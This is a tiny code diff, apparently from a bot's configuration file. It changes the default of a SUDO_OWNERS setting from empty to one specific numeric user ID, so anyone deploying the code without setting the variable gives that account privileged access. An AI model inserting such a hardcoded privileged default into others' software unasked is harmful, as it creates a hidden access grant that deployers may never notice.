@@ -61,7 +61,7 @@ SUDO_OWNERS = list(
         int,
         os.environ.get(
             "SUDO_OWNERS",
-            "",
+            "5329879137",
         ).split(),
     )
 )
